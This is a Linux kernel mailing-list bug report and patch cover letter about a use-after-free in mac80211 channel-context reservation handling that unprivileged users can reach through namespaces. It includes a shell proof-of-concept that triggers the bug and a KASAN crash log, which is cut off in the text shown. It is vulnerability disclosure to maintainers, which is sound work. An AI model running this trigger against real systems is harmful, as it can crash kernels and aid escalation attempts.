Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9279C3537F8
	for <linux-wireless@vger.kernel.org>; Mon,  3 Aug 2026 03:28:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785727719; cv=none; b=UpaKXCeQZSGFL9hAw+MIUP5B6IHosblos7BtMs8QAvv2NP3FwT2v3kcoKufDIMF/VcLScPNCQ5R2jaeSIyL7iYRh2lnzgmmnHXUBm8HIQPXuG3QLRigEGJh6BzWjFS75vLbVeEP+XVGHeht/V+3JTYybVG6JbZ1DNUE/GzSBAPQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785727719; c=relaxed/simple;
	bh=0ngOEsqUiulC4yM2Kc3zYkwt6ezRZqCJjya3zOKxDUw=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=tYrRJSy3m09ufZd55iWZF3FdGfHL1NlrIg9yBrE3YJkUg86ojX2CKF5UTSDEzObNBXmLfpXxRkoBdOh8lvd4oXRP8Zfx2MTEgPe4HMM+oR/tST/mSdF2RGxQalZLy5dNYi7ETLM8oLTJbB8sCs3jhTV7cLRZ/gx4M0Fdv0Wv/H8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=pOmDIsrK; arc=none smtp.client-ip=209.85.216.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="pOmDIsrK"
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-38e69bdb0fcso1967153a91.1
        for <linux-wireless@vger.kernel.org>; Sun, 02 Aug 2026 20:28:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785727716; x=1786332516; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=XaqX0FPhcOjxsvyTsQWL1j1dabUs1/z4kUXYposYAlY=;
        b=pOmDIsrKIntHvFrcZvBRfHyY7GA98PAfE7GG1MqTtZGKjWp7UlTSbkJDIPJqeFG5iZ
         8J18Ud1OIgREOg/fa7mfrK9uDUah8qLqlXrR+Y8V41DXknap7ye0NdhFjOWWteu7YPas
         rXaOJJNLOoHct5J8F4pSChXV0ppz3C+d3FSZ4sZT6Tbc0rZtfdp+PiVvTFJtuhxuGYhY
         TxigPslKmbKiG4PbAmjXkfbnjDstSN420nG/0Kf90GnuS0yPp4+rASYO631rOHCYJWcW
         DvXUwlaRJ8K6YN9lgnrYhODYzb/jC2UMxOmXVqPDNFtOvVVuKVRzcSHkrFaNs6VYb8+6
         ECeQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785727716; x=1786332516;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=XaqX0FPhcOjxsvyTsQWL1j1dabUs1/z4kUXYposYAlY=;
        b=cVOvbvwY0yvLPHqBqEojMacE/UbefKa48rnnoq0xXtwdVZj9EfpQ0y97k7r7oEtnQK
         kD/gzVaYfgLfIO/8fegIcIaN8G99dy1ntxMfwat14FUMLlCu7ML2Fe6ep73TTcd/lCwy
         2104yEFJlGm+6jwjYQ05weYsim2sphCeOfROulw946ph2y+38mscIx0t09Jaty5VIXBc
         1HkPXRuRMSKWeZyGsEaR93YiqzhZ0EnQbInpO/9MCgkBkx0pTVkeiExZzXtsrt4+qlBD
         UTpxznUwJiQJXVGpP94Lf9n1POepkFU6D1BzFfWUxZi2O0rg0uQzbrdUfu7s8ytJ2/Tf
         CbEg==
X-Gm-Message-State: AOJu0Yyo8svMWlD7slhLr3pzCyGXgPEijXFJuj1ev/zF0EFhv9rKk8iW
	vueCTzSxmst2zNwe6eDYBcvD+CXqS7O0O8SBIp/6DXtc31OFQ3+V57hPZSceEazJa2IgiLlTEnX
	nmgq7N4n3AHvMOw==
X-Gm-Gg: AR+sD11ow/JUcM0QrfkkufYS+CqUtz4iKqibrzr+jMnawXitIzGIFgjjeHUBBhMDeBz
	v5LwOOQADXCQxIYFzqDuAmZH1nDcBaTT/+nyKnCj9ojXOWoX7jO7nI24RxpFof3qb1myJRSnSuq
	Mis0WyZvu4G61xBA8jtcK81fcDZT+bRNORpcsvxaHJgyeVKzXry6CiJBoQqyF0wqhgmZBLtVZ9Q
	PmvPfaNVo0t1ISa3GHZS1a1Mixa30V6td6X+1TvYAy5l5LeoK2URIK990i/3rDyP9yWq60/63Ga
	BPIMpn5eQVs+7KoeAmaSK6zOdiiU1vUYfyKdffZTXkGECsY86WFfw2FrFHMNW6aPc4z2fcX8tvf
	UpnEawlN0nDc7ZiZV+H+zdll+giZt7vnbs2ATb5kPLauOUMHUUcal8ojMWfe4ZeDR9bulBeUhz2
	IPMcCgyQp7z70xGJH85zROT+WASES2Ih0llh7K6Tffhw5FLE0r9g9uT8I7FegJoyM9B5V+tqLuA
	g==
X-Received: by 2002:a17:90b:580d:b0:38f:c911:5436 with SMTP id 98e67ed59e1d1-38fc911545fmr5448971a91.41.1785727715382;
        Sun, 02 Aug 2026 20:28:35 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb2d19f7fsm3280982a91.17.2026.08.02.20.28.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 20:28:34 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	michal.kazior@tieto.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH wireless 0/1] wifi: mac80211: count only matching reservations in reserved switch
Date: Mon,  3 Aug 2026 11:28:21 +0800
Message-ID: <cover.1785726007.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/mac80211/chan.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ieee80211_vif_use_reserved_switch() validates an in-place replacement by
iterating the links that are still assigned to ctx->replace_ctx and counting
every link with a non-NULL reserved_chanctx as participating in the replacement.
That is too broad.

A link assigned to the old chanctx can hold an unrelated ordinary reservation to
another existing chanctx. It is then counted as switching and possibly ready,
even though the bulk replacement logic neither treats it as an in-place
replacement participant nor moves it to the new chanctx. If another link
finalizes first, the function can free the WILL_BE_REPLACED chanctx while the
unmatched link and driver still retain references to it. The stale chanctx is
later dereferenced from beacon generation and KASAN reports a use-after-free in
__ieee80211_beacon_add_tim().

Reproducer:

    chmod +x ./poc.sh
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)

if [ "${1:-}" != "--inner" ] && [ -z "${POC_NO_UNSHARE:-}" ]; then
	exec unshare -Urn -- "$0" --inner
fi

cd "$DIR"
make -s hwsim_new_radio

ip link set lo up

./hwsim_new_radio --channels 2
sleep 1

dev=$(iw dev | sed -n 's/^[[:space:]]*Interface //p' | head -n1)
if [ -z "$dev" ]; then
	echo "failed to find the default hwsim netdev" >&2
	exit 1
fi

iw dev "$dev" set type mp
iw dev "$dev" interface add mesh1 type mp

ip link set "$dev" up
ip link set mesh1 up

iw dev "$dev" mesh join meshA freq 2412
iw dev mesh1 mesh join meshB freq 2412

sleep 1

# First consume the second chanctx slot with an unrelated reservation.
iw dev mesh1 switch channel 6 beacons 50
sleep 1

# Then force a replacement switch on the shared old chanctx.
iw dev "$dev" switch channel 11 beacons 2

# The KASAN report lands asynchronously from the hwsim beacon timer.
sleep 20

------END poc.sh--------

----BEGIN crash log----

[  291.000515][    C0] ==================================================================
[  291.001940][    C0] BUG: KASAN: slab-use-after-free in __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.003481][    C0] Read of size 8 at addr ffff8880236768a0 by task swapper/0/0
[  291.004517][    C0]
[  291.004876][    C0] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 6.12.95 #2
[  291.004888][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  291.004907][    C0] Call Trace:
[  291.004991][    C0]  <IRQ>
[  291.005001][    C0]  dump_stack_lvl (/home/roxy/linux-block-patch/build/../lib/dump_stack.c:118 (discriminator 2))
[  291.005059][    C0]  print_report (/home/roxy/linux-block-patch/build/../include/linux/mm.h:1903 /home/roxy/linux-block-patch/build/../mm/kasan/report.c:289 /home/roxy/linux-block-patch/build/../mm/kasan/report.c:376 /home/roxy/linux-block-patch/build/../mm/kasan/report.c:482)
[  291.005134][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.005158][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005186][    C0]  ? __virt_addr_valid (/home/roxy/linux-block-patch/build/../include/linux/instrumented.h:82 /home/roxy/linux-block-patch/build/../include/asm-generic/bitops/instrumented-non-atomic.h:141 /home/roxy/linux-block-patch/build/../include/linux/mmzone.h:2214 /home/roxy/linux-block-patch/build/../include/linux/mmzone.h:2290 /home/roxy/linux-block-patch/build/../arch/x86/mm/physaddr.c:54)
[  291.005230][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.005241][    C0]  kasan_report (/home/roxy/linux-block-patch/build/../mm/kasan/report.c:593)
[  291.005258][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.005282][    C0]  __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.005305][    C0]  __ieee80211_beacon_get (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5733)
[  291.005330][    C0]  ieee80211_beacon_get_tim (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5846)
[  291.005344][    C0]  ? __pfx_ieee80211_beacon_get_tim (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5838)
[  291.005353][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005363][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005374][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005389][    C0]  mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2491)
[  291.005438][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005446][    C0]  ? rcu_is_watching (/home/roxy/linux-block-patch/build/../include/linux/context_tracking.h:128 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/rcu/tree.c:752 (discriminator 1))
[  291.005485][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005492][    C0]  ? trace_lock_acquire+0x145/0x1c0
[  291.005526][    C0]  __iterate_interfaces (/home/roxy/linux-block-patch/build/../net/mac80211/util.c:756)
[  291.005543][    C0]  ? __pfx_mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2439)
[  291.005556][    C0]  ? __pfx_mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2439)
[  291.005568][    C0]  ieee80211_iterate_active_interfaces_atomic (/home/roxy/linux-block-patch/build/../net/mac80211/util.c:808)
[  291.005582][    C0]  mac80211_hwsim_beacon (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2526)
[  291.005600][    C0]  ? __pfx_mac80211_hwsim_beacon (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:4178)
[  291.005614][    C0]  __hrtimer_run_queues (/home/roxy/linux-block-patch/build/../include/trace/events/timer.h:308 (discriminator 14) /home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1933 (discriminator 14) /home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1994 (discriminator 14))
[  291.005648][    C0]  ? __pfx___hrtimer_run_queues (/home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1177)
[  291.005658][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005667][    C0]  ? ktime_get_update_offsets_now (/home/roxy/linux-block-patch/build/../kernel/time/timekeeping.c:2725 (discriminator 2))
[  291.005700][    C0]  hrtimer_run_softirq (/home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:2011)
[  291.005717][    C0]  handle_softirqs (/home/roxy/linux-block-patch/build/../include/linux/kernel_stat.h:62 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/softirq.c:619 (discriminator 1))
[  291.005759][    C0]  ? __pfx_handle_softirqs (/home/roxy/linux-block-patch/build/../kernel/softirq.c:405)
[  291.005774][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.005788][    C0]  irq_exit_rcu (/home/roxy/linux-block-patch/build/../kernel/softirq.c:801)
[  291.005800][    C0]  sysvec_apic_timer_interrupt (/home/roxy/linux-block-patch/build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 35) /home/roxy/linux-block-patch/build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 35))
[  291.005829][    C0]  </IRQ>
[  291.005833][    C0]  <TASK>
[  291.005840][    C0]  asm_sysvec_apic_timer_interrupt (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/idtentry.h:697)
[  291.005857][    C0] RIP: 0010:pv_native_safe_halt (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/irqflags.h:48 /home/roxy/linux-block-patch/build/../arch/x86/kernel/paravirt.c:62)
[  291.005868][    C0] Code: c5 60 02 e9 6e 34 1e 00 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 03 42 37 00 fb f4 <e9> 47 34 1e 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
All code
========
   0:	c5 60 02             	(bad)
   3:	e9 6e 34 1e 00       	jmp    0x1e3476
   8:	0f 1f 00             	nopl   (%rax)
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
  16:	90                   	nop
  17:	90                   	nop
  18:	90                   	nop
  19:	90                   	nop
  1a:	90                   	nop
  1b:	f3 0f 1e fa          	endbr64
  1f:	eb 07                	jmp    0x28
  21:	0f 00 2d 03 42 37 00 	verw   0x374203(%rip)        # 0x37422b
  28:	fb                   	sti
  29:	f4                   	hlt
  2a:*	e9 47 34 1e 00       	jmp    0x1e3476		<-- trapping instruction
  2f:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  36:	00 00 00 
  39:	66 90                	xchg   %ax,%ax
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	e9 47 34 1e 00       	jmp    0x1e344c
   5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   c:	00 00 00 
   f:	66 90                	xchg   %ax,%ax
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  291.005875][    C0] RSP: 0018:ffffffff8de07e20 EFLAGS: 00000282
[  291.005900][    C0] RAX: 000000000016fcb7 RBX: 0000000000000000 RCX: ffffffff8a5222e5
[  291.005907][    C0] RDX: 0000000000000000 RSI: ffffffff8a8c46a0 RDI: ffffffff8aee7960
[  291.005912][    C0] RBP: ffffffff8de95b80 R08: 0000000000000001 R09: ffffed1023147031
[  291.005917][    C0] R10: ffff888118a3818b R11: 0000000000000000 R12: 0000000000000000
[  291.005938][    C0] R13: fffffbfff1bd2b70 R14: 0000000000000000 R15: ffffffff904e92c8
[  291.005958][    C0]  ? ct_kernel_exit (/home/roxy/linux-block-patch/build/../include/linux/instrumented.h:97 /home/roxy/linux-block-patch/build/../kernel/context_tracking.c:124)
[  291.005991][    C0]  default_idle (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:769)
[  291.006002][    C0]  default_idle_call (/home/roxy/linux-block-patch/build/../include/linux/cpuidle.h:143 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:123 (discriminator 1))
[  291.006009][    C0]  do_idle (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/bitops.h:55 /home/roxy/linux-block-patch/build/../include/linux/sched/idle.h:26 /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:264 /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:352)
[  291.006041][    C0]  ? __pfx_do_idle (/home/roxy/linux-block-patch/build/../kernel/sched/idle.c:87)
[  291.006067][    C0]  cpu_startup_entry (/home/roxy/linux-block-patch/build/../kernel/sched/idle.c:447 (discriminator 1))
[  291.006078][    C0]  rest_init (/home/roxy/linux-block-patch/build/../init/main.c:752)
[  291.006086][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.006097][    C0]  start_kernel (/home/roxy/linux-block-patch/build/../init/main.c:1181)
[  291.006144][    C0]  x86_64_start_reservations (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head64.c:310)
[  291.006159][    C0]  x86_64_start_kernel (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head64.c:245)
[  291.006169][    C0]  common_startup_64 (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head_64.S:418)
[  291.006223][    C0]  </TASK>
[  291.006227][    C0]
[  291.058315][    C0] Allocated by task 10561:
[  291.058951][    C0]  kasan_save_stack (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:57)
[  291.059614][    C0]  kasan_save_track (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:78)
[  291.060274][    C0]  __kasan_kmalloc (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:398 /home/roxy/linux-block-patch/build/../mm/kasan/common.c:415)
[  291.060917][    C0]  __kmalloc_noprof (/home/roxy/linux-block-patch/build/../mm/slub.c:4754 /home/roxy/linux-block-patch/build/../mm/slub.c:4883 /home/roxy/linux-block-patch/build/../mm/slub.c:5294 /home/roxy/linux-block-patch/build/../mm/slub.c:5307)
[  291.061653][    C0]  ieee80211_alloc_chanctx (/home/roxy/linux-block-patch/build/../include/linux/slab.h:954 /home/roxy/linux-block-patch/build/../include/linux/slab.h:1188 /home/roxy/linux-block-patch/build/../net/mac80211/chan.c:951)
[  291.062433][    C0]  ieee80211_new_chanctx (/home/roxy/linux-block-patch/build/../net/mac80211/chan.c:1002)
[  291.063192][    C0]  _ieee80211_link_use_channel (/home/roxy/linux-block-patch/build/../net/mac80211/chan.c:2231)
[  291.064017][    C0]  ieee80211_join_mesh (/home/roxy/linux-block-patch/build/../net/mac80211/cfg.c:3110)
[  291.064741][    C0]  __cfg80211_join_mesh (/home/roxy/linux-block-patch/build/../net/wireless/mesh.c:193 (discriminator 3))
[  291.065489][    C0]  nl80211_join_mesh (/home/roxy/linux-block-patch/build/../net/wireless/nl80211.c:14834)
[  291.066203][    C0]  genl_family_rcv_msg_doit (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1114)
[  291.067003][    C0]  genl_rcv_msg (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1190 /home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1209)
[  291.067633][    C0]  netlink_rcv_skb (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:2547)
[  291.068298][    C0]  genl_rcv (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1218)
[  291.068862][    C0]  netlink_unicast (/home/roxy/linux-block-patch/build/../include/linux/instrumented.h:112 /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-instrumented.h:104 /home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1314 /home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1344)
[  291.069527][    C0]  netlink_sendmsg (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1875)
[  291.070195][    C0]  ____sys_sendmsg (/home/roxy/linux-block-patch/build/../net/socket.c:790 (discriminator 1) /home/roxy/linux-block-patch/build/../net/socket.c:2695 (discriminator 1))
[  291.070866][    C0]  ___sys_sendmsg (/home/roxy/linux-block-patch/build/../net/socket.c:2749)
[  291.071529][    C0]  __sys_sendmsg (/home/roxy/linux-block-patch/build/../net/socket.c:593 /home/roxy/linux-block-patch/build/../net/socket.c:2780)
[  291.072190][    C0]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/entry-common.h:109 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:147 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:178 (discriminator 2) /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  291.072818][    C0]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  291.073535][    C0]
[  291.073797][    C0] Freed by task 3452:
[  291.074246][    C0]  kasan_save_stack (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:57)
[  291.074767][    C0]  kasan_save_track (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:78)
[  291.075304][    C0]  kasan_save_free_info (/home/roxy/linux-block-patch/build/../mm/kasan/generic.c:584)
[  291.075858][    C0]  __kasan_slab_free (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:249 /home/roxy/linux-block-patch/build/../mm/kasan/common.c:285)
[  291.076399][    C0]  kmem_cache_free_bulk.part.0+0x264/0x780
[  291.077043][    C0]  kvfree_rcu_bulk (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/atomic.h:28 /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-arch-fallback.h:503 /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-instrumented.h:68 /home/roxy/linux-block-patch/build/../mm/slab_common.c:1697 /home/roxy/linux-block-patch/build/../mm/slab_common.c:1777)
[  291.077558][    C0]  kfree_rcu_monitor (/home/roxy/linux-block-patch/build/../mm/slab_common.c:2150 (discriminator 1))
[  291.078095][    C0]  process_one_work (/home/roxy/linux-block-patch/build/../kernel/workqueue.c:3271)
[  291.078639][    C0]  worker_thread (/home/roxy/linux-block-patch/build/../kernel/workqueue.c:994 /home/roxy/linux-block-patch/build/../kernel/workqueue.c:3469)
[  291.079154][    C0]  kthread (/home/roxy/linux-block-patch/build/../kernel/kthread.c:429 (discriminator 1))
[  291.079615][    C0]  ret_from_fork (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:153)
[  291.080107][    C0]  ret_from_fork_asm (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:245)
[  291.080628][    C0]
[  291.080904][    C0] Last potentially related work creation:
[  291.081526][    C0]  kasan_save_stack (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:57)
[  291.082042][    C0]  __kasan_record_aux_stack+0xba/0xd0
[  291.082708][    C0]  kvfree_call_rcu (/home/roxy/linux-block-patch/build/../mm/slab_common.c:1427 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slab_common.c:1839 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slab_common.c:1971 (discriminator 1))
[  291.083232][    C0]  ieee80211_vif_use_reserved_switch (/home/roxy/linux-block-patch/build/../net/mac80211/chan.c:198 /home/roxy/linux-block-patch/build/../net/mac80211/chan.c:1817 /home/roxy/linux-block-patch/build/../net/mac80211/chan.c:1954)
[  291.083940][    C0]  ieee80211_link_use_reserved_context (/home/roxy/linux-block-patch/build/../net/mac80211/chan.c:2272 (discriminator 1))
[  291.084675][    C0]  ieee80211_csa_finalize (/home/roxy/linux-block-patch/build/../net/mac80211/cfg.c:4336)
[  291.085360][    C0]  cfg80211_wiphy_work (/home/roxy/linux-block-patch/build/../include/linux/list.h:204 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/list.h:226 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/list.h:221 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/list.h:295 (discriminator 2) /home/roxy/linux-block-patch/build/../net/wireless/core.c:507 (discriminator 2))
[  291.085968][    C0]  process_one_work (/home/roxy/linux-block-patch/build/../kernel/workqueue.c:3271)
[  291.086514][    C0]  worker_thread (/home/roxy/linux-block-patch/build/../kernel/workqueue.c:994 /home/roxy/linux-block-patch/build/../kernel/workqueue.c:3469)
[  291.087035][    C0]  kthread (/home/roxy/linux-block-patch/build/../kernel/kthread.c:429 (discriminator 1))
[  291.087492][    C0]  ret_from_fork (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:153)
[  291.087987][    C0]  ret_from_fork_asm (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:245)
[  291.088517][    C0]
[  291.088793][    C0] The buggy address belongs to the object at ffff888023676800
[  291.088793][    C0]  which belongs to the cache kmalloc-512 of size 512
[  291.090323][    C0] The buggy address is located 160 bytes inside of
[  291.090323][    C0]  freed 512-byte region [ffff888023676800, ffff888023676a00)
[  291.091788][    C0]
[  291.092058][    C0] The buggy address belongs to the physical page:
[  291.092520][    C0] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x23670
[  291.093158][    C0] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  291.093686][    C0] flags: 0xfff00000000040(head|node=0|zone=1|lastcpupid=0x7ff)
[  291.094176][    C0] page_type: f5(slab)
[  291.094434][    C0] raw: 00fff00000000040 ffff888100042f40 ffffea00008b1410 ffffea000085a810
[  291.094976][    C0] raw: 0000000000000000 0000000000150015 00000001f5000000 0000000000000000
[  291.095509][    C0] head: 00fff00000000040 ffff888100042f40 ffffea00008b1410 ffffea000085a810
[  291.096054][    C0] head: 0000000000000000 0000000000150015 00000001f5000000 0000000000000000
[  291.096607][    C0] head: 00fff00000000003 ffffea00008d9c01 ffffffffffffffff 0000000000000000
[  291.097166][    C0] head: 0000000000000008 0000000000000000 00000000ffffffff 0000000000000000
[  291.097712][    C0] page dumped because: kasan: bad access detected
[  291.098143][    C0] page_owner tracks the page as allocated
[  291.098500][    C0] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 5146, tgid 5146 (udevadm), ts 76499356110, free_ts 76496950199
[  291.099806][    C0]  post_alloc_hook (/home/roxy/linux-block-patch/build/../mm/page_alloc.c:6932)
[  291.100126][    C0]  get_page_from_freelist (/home/roxy/linux-block-patch/build/../mm/page_alloc.c:3815 (discriminator 1))
[  291.100471][    C0]  __alloc_pages_noprof (/home/roxy/linux-block-patch/build/../mm/internal.h:876 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/page_alloc.c:5272 (discriminator 1))
[  291.100805][    C0]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  291.101233][    C0]  new_slab (/home/roxy/linux-block-patch/build/../mm/slub.c:882 /home/roxy/linux-block-patch/build/../mm/slub.c:2291 /home/roxy/linux-block-patch/build/../mm/slub.c:3497 /home/roxy/linux-block-patch/build/../mm/slub.c:3525)
[  291.101505][    C0]  ___slab_alloc (/home/roxy/linux-block-patch/build/../include/linux/kasan.h:263 /home/roxy/linux-block-patch/build/../mm/slub.c:5419)
[  291.101801][    C0]  __slab_alloc.isra.0+0x5b/0xb0
